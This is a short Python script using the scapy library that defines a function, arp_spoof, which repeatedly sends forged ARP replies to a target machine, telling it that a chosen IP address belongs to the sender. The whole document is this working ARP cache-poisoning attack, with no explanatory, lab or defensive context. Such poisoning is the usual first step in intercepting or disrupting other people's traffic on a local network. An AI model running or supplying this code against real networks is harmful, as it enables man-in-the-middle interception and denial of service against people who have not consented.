from scapy.all import ARP, send
import time

def arp_spoof(target_ip, spoof_ip, iface="eth0"):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    while True:
        send(packet, iface=iface, verbose=False)
        time.sleep(2)
